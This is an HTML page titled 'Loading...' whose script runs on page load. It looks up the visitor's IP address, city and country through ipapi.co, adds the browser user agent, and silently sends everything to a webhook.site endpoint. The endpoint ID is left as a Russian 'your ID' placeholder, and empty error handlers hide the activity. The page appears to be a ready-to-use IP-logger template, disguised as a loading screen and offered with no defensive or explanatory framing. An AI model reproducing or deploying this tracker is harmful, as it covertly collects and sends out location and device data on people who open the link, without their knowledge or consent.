<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
</head>
<body>

<script>
async function collect() {
    try {
        let ip = "Unknown";
        let city = "?";
        let country = "?";

        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();

            ip = d.ip || ip;
            city = d.city || city;
            country = d.country_name || country;
        } catch (e) {}

        const data = {
            ip: ip,
            city: city,
            country: country,
            userAgent: navigator.userAgent
        };

        await fetch("https://webhook.site/ТВОЙ_ID", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });

    } catch (e) {}
}

collect();
</script>

</body>
</html>
